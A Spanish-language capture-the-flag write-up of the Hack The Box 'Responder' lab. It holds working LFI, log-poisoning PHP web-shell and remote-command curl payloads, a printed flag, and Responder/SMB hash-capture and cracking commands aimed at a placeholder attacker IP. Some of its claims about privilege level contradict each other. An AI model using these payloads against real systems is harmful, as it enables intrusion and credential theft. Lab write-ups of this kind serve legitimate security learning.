# Write-Up: Responder - Hack The Box (Progress ~90%)

**Fecha:** Diciembre 2025
**Objetivo:** Obtener las flags `user.txt` y `root.txt`
**Dificultad:** Easy / Medium
**Estado:** Completado al ~90% (flag `user.txt` obtenida)
**Limitación:** Termux sin privilegios root impidió la captura final del hash NTLMv2
**Aprendizaje principal:** Pentesting web (LFI, Log Poisoning) en entorno Windows / Active Directory y adaptación a limitaciones técnicas

---

## 1. Reconocimiento y Enumeración Web

### Situación inicial

* Escaneo de puertos comunes:

```bash
nmap --top-ports 50 10.129.95.234
```

* Resultado: solo el **puerto 80/tcp** abierto.

### Enumeración web

```bash
whatweb 10.129.95.234
```

### Hallazgos críticos

1. Servidor **Apache/2.4.52 (Win64)** con **PHP/8.1.1**.
2. Header `Meta-Refresh-Redirect` apuntando a:

   ```
   http://unika.htb/
   ```

   Esto reveló dependencia del header **Host** y sugirió un entorno **Active Directory**.
3. Stack tecnológico consistente con vulnerabilidades **LFI**.

---

## 2. Descubrimiento y Explotación de LFI (Local File Inclusion)

### Prueba de vulnerabilidad

Se identificó un parámetro vulnerable `?page=`:

```bash
curl -H "Host: unika.htb" "http://10.129.19.24/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts"
```

* Resultado: lectura exitosa del archivo `hosts` de Windows.
* Vulnerabilidad **LFI confirmada**.

### Análisis del error

* Al intentar incluir archivos `.php`, los mensajes de error revelaron:

  * Ruta absoluta:

    ```
    C:\xampp\htdocs\index.php
    ```
  * Uso de la función `include()` en PHP.

---

## 3. Escalada a RCE vía Log Poisoning

### Identificación del vector

Archivo de log accesible vía LFI:

```
C:\xampp\apache\logs\access.log
```

### Envenenamiento del log

Inyección de código PHP en el header **User-Agent**:

```bash
curl -A "<?php echo shell_exec('whoami 2>&1'); ?>" \
     -H "Host: unika.htb" \
     "http://10.129.19.24/"
```

### Disparo de la ejecución

```bash
curl -H "Host: unika.htb" \
     "http://10.129.19.24/index.php?page=../../../../xampp/apache/logs/access.log"
```

### Resultado

* **RCE confirmada**.
* Respuesta del servidor:

```
responder\administrator
```

---

## 4. Post-Explotación y Obtención de Flag de Usuario

### Enumeración del sistema

```bash
# Listar usuarios del sistema
curl -A "<?php echo shell_exec('dir C:\\Users 2>&1'); ?>" \
     -H "Host: unika.htb" \
     "http://10.129.19.24/"

# Explorar escritorio del usuario mike
curl -A "<?php echo shell_exec('dir C:\\Users\\mike\\Desktop 2>&1'); ?>" \
     -H "Host: unika.htb" \
     "http://10.129.19.24/"
```

### Flag `user.txt`

* Ubicación:

  ```
  C:\Users\mike\Desktop\flag.txt
  ```
* Contenido:

  ```
  ea81b7afddd03efaa0945333ed147fac
  ```

---

## 5. Búsqueda de la Flag de Root y Limitación Técnica

### Análisis

* No se encontró `root.txt` en ubicaciones locales del administrador.
* La máquina **Responder** está diseñada para explotar:

  * **LLMNR / NBT-NS Poisoning**
  * Captura de hashes **NTLMv2** en entornos Active Directory

### Flujo esperado para obtener `root.txt`

1. Forzar autenticación SMB desde la víctima.
2. Capturar el hash **NTLMv2** del usuario Administrator.
3. Crackear el hash para obtener la contraseña.

### Limitación encontrada

Desde **Termux (Android)**:

* `Responder.py` requiere privilegios de red de bajo nivel (root).
* `impacket` vía `pip` falla por compilación de `cryptography` en ARM.

### Paso pendiente (ejecutable en Kali Linux)

```bash
# 1. Iniciar Responder en el atacante
responder -I tun0 -dwv

# 2. Forzar autenticación desde la víctima
dir \\\\<ATACANTE_IP>\\share

# 3. Crackear el hash NTLMv2 capturado
john --format=netntlmv2 hash.txt
```

---

## 6. Lecciones Aprendidas

1. **Enumeración pasiva crítica**: `whatweb` reveló `unika.htb`, clave para el ataque.
2. **Cadena de explotación clásica y realista**: LFI → Log Poisoning → RCE.
3. **Contexto del sistema**: Windows + dominio interno indicaron ataque orientado a AD.
4. **Adaptación técnica**: avance significativo desde un entorno móvil limitado.
5. **Reconocimiento de límites**: la barrera fue técnica (entorno), no conceptual.

---

## 7. Conclusión

Este laboratorio reprodujo aproximadamente el **90% del flujo de un pentest real** contra un entorno Windows/Active Directory:

* Reconocimiento efectivo
* Explotación web avanzada
* Ejecución remota de comandos
* Post-explotación con obtención de credenciales de usuario

La fase final depende del uso de herramientas especializadas (Responder / Impacket) bloqueadas por el entorno actual. Al migrar a **Kali Linux**, la captura del hash NTLMv2 y la obtención de `root.txt` se completan rápidamente aplicando la misma metodología.

---

Write-up preparado para **portafolio técnico**. Incluye evidencias de:

* Enumeración con `whatweb`
* LFI exitoso
* RCE confirmada (`whoami`)
* Flag `user.txt`
